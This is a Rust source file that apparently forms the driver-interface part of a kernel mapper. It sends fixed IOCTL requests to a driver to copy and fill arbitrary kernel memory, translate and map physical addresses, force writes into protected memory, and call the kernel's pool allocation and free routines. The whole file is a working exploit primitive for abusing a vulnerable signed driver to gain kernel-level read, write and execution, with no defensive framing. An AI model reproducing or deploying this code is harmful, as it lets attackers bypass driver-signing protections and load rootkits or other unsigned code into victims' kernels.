use core::panic;
use std::intrinsics::transmute;

use winapi::{
    ctypes::c_void,
    shared::minwindef::DWORD,
    um::{ioapiset::DeviceIoControl, winnt::HANDLE},
};

use crate::util::{call_kernel_fn, get_kernel_module_address, get_kernel_module_export};

const IO_MAGIC: u32 = 0x80862007;

#[repr(C)]
#[derive(Default)]
struct CopyMemoryBufferInfo {
    case_number: u64,
    reserved: u64,
    source: u64,
    destination: u64,
    length: u64,
}

#[repr(C)]
#[derive(Default)]
struct FillMemoryBufferInfo {
    case_number: u64,
    reserved: u64,
    value: u32,
    reserved2: u32,
    destination: u64,
    length: u64,
}

#[repr(C)]
#[derive(Default)]
struct GetPhysicalAddressBufferInfo {
    case_number: u64,
    reserved: u64,
    return_physical_address: u64,
    address_to_translate: u64,
}

#[repr(C)]
#[derive(Default)]
struct MapIOSpaceBufferInfo {
    case_number: u64,
    reserved: u64,
    return_value: u64,
    return_virtual_address: u64,
    physical_address_to_map: u64,
    size: u32,
}

#[repr(C)]
#[derive(Default)]
struct UnmapIOSpaceBufferInfo {
    case_number: u64,
    reserved: u64,
    reserved2: u64,
    virtual_address: u64,
    reserved3: u64,
    number_of_bytes: u32,
}

pub fn copy_memory(service: HANDLE, destination: u64, source: u64, size: u64) -> bool {
    if destination == 0 || source == 0 || size == 0 {
        return false;
    }

    let mut buffer = CopyMemoryBufferInfo::default();
    buffer.case_number = 0x33;
    buffer.source = source;
    buffer.destination = destination;
    buffer.length = size;

    let mut bytes_returned: DWORD = 0;

    unsafe {
        DeviceIoControl(
            service,
            IO_MAGIC,
            &mut buffer as *mut CopyMemoryBufferInfo as *mut _,
            std::mem::size_of::<CopyMemoryBufferInfo>() as _,
            std::ptr::null_mut(),
            0,
            &mut bytes_returned,
            std::ptr::null_mut(),
        ) == 1
    }
}

pub fn set_memory(service: HANDLE, address: u64, value: u32, size: u64) -> bool {
    if address == 0 || size == 0 {
        return false;
    }

    let mut fill_memory_buffer = FillMemoryBufferInfo::default();
    fill_memory_buffer.case_number = 0x30;
    fill_memory_buffer.destination = address;
    fill_memory_buffer.value = value;
    fill_memory_buffer.length = size;

    let mut bytes_returned: DWORD = 0;

    unsafe {
        DeviceIoControl(
            service,
            IO_MAGIC,
            &mut fill_memory_buffer as *mut FillMemoryBufferInfo as *mut _,
            std::mem::size_of::<FillMemoryBufferInfo>() as _,
            std::ptr::null_mut(),
            0,
            &mut bytes_returned,
            std::ptr::null_mut(),
        ) == 1
    }
}

pub fn get_physical_address(service: HANDLE, address: u64, out_physical_address: &mut u64) -> bool {
    if address == 0 {
        return false;
    }

    let mut buffer = GetPhysicalAddressBufferInfo::default();
    buffer.case_number = 0x25;
    buffer.address_to_translate = address;

    let mut bytes_returned: DWORD = 0;

    if unsafe {
        DeviceIoControl(
            service,
            IO_MAGIC,
            &mut buffer as *mut GetPhysicalAddressBufferInfo as *mut _,
            std::mem::size_of::<GetPhysicalAddressBufferInfo>() as _,
            std::ptr::null_mut(),
            0,
            &mut bytes_returned,
            std::ptr::null_mut(),
        )
    } == 0
    {
        return false;
    }

    *out_physical_address = buffer.return_physical_address;

    true
}

pub fn map_io_space(service: HANDLE, address: u64, size: u32) -> u64 {
    if address == 0 || size == 0 {
        return 0;
    }

    let mut buffer = MapIOSpaceBufferInfo::default();
    buffer.case_number = 0x19;
    buffer.physical_address_to_map = address;
    buffer.size = size;

    let mut bytes_returned: DWORD = 0;

    if unsafe {
        DeviceIoControl(
            service,
            IO_MAGIC,
            &mut buffer as *mut MapIOSpaceBufferInfo as *mut _,
            std::mem::size_of::<MapIOSpaceBufferInfo>() as _,
            std::ptr::null_mut(),
            0,
            &mut bytes_returned,
            std::ptr::null_mut(),
        )
    } == 0
    {
        return 0;
    }

    buffer.return_virtual_address
}

pub fn unmap_io_space(service: HANDLE, address: u64, size: u32) -> bool {
    if address == 0 || size == 0 {
        return false;
    }

    let mut buffer = UnmapIOSpaceBufferInfo::default();
    buffer.case_number = 0x1A;
    buffer.virtual_address = address;
    buffer.number_of_bytes = size;

    let mut bytes_returned: DWORD = 0;

    unsafe {
        DeviceIoControl(
            service,
            IO_MAGIC,
            &mut buffer as *mut UnmapIOSpaceBufferInfo as *mut _,
            std::mem::size_of::<UnmapIOSpaceBufferInfo>() as _,
            std::ptr::null_mut(),
            0,
            &mut bytes_returned,
            std::ptr::null_mut(),
        ) == 1
    }
}

pub fn read_memory(service: HANDLE, address: u64, buffer: *mut usize, size: u64) -> bool {
    copy_memory(service, buffer as _, address, size)
}

pub fn write_memory(service: HANDLE, address: u64, buffer: *mut usize, size: u64) -> bool {
    copy_memory(service, address, buffer as _, size)
}

pub fn force_write_memory(service: HANDLE, address: u64, buffer: *mut usize, size: u32) -> bool {
    if address == 0 || buffer.is_null() || size == 0 {
        return false;
    }

    let mut physical_address: u64 = 0;

    if !get_physical_address(service, address, &mut physical_address) {
        panic!("Failed to translate virtual address!");
    }

    let mapped_physical_mem = map_io_space(service, physical_address, size);

    if mapped_physical_mem == 0 {
        panic!("Failed to map IO space");
    }

    let result = write_memory(service, mapped_physical_mem, buffer, size as _);

    if !unmap_io_space(service, mapped_physical_mem, size) {
        panic!("Failed to unmap IO space of physical address");
    }

    result
}

type ExAllocatePoolFn = unsafe extern "system" fn(i32, usize) -> *mut usize;

pub fn allocate_pool(service: HANDLE, pool_type: i32, size: u64) -> u64 {
    if size == 0 {
        return 0;
    }

    static mut KERNEL_EX_ALLOCATE_POOL: u64 = 0;

    unsafe {
        if KERNEL_EX_ALLOCATE_POOL == 0 {
            KERNEL_EX_ALLOCATE_POOL = get_kernel_module_export(
                service,
                get_kernel_module_address("ntoskrnl.exe") as _,
                "ExAllocatePool",
            );
        }

        let mut allocated_pool: u64 = 0;

        if !call_kernel_fn(
            service,
            &mut |address| {
                allocated_pool =
                    (transmute::<*mut usize, ExAllocatePoolFn>(address))(pool_type, size as _) as _;

                true
            },
            KERNEL_EX_ALLOCATE_POOL,
        ) {
            return 0;
        }

        allocated_pool
    }
}

type ExFreePoolFn = unsafe extern "system" fn(addy: *mut c_void);

pub fn free_pool(service: HANDLE, addy: u64) -> bool {
    if addy == 0 {
        return false;
    }

    static mut KERNEL_EX_FREE_POOL: u64 = 0;

    unsafe {
        if KERNEL_EX_FREE_POOL == 0 {
            KERNEL_EX_FREE_POOL = get_kernel_module_export(
                service,
                get_kernel_module_address("ntoskrnl.exe") as _,
                "ExFreePool",
            );
        }

        if !call_kernel_fn(
            service,
            &mut |address| {
                transmute::<_, ExFreePoolFn>(address)(addy as _);

                true
            },
            KERNEL_EX_FREE_POOL,
        ) {
            return false;
        }
    }

    true
}
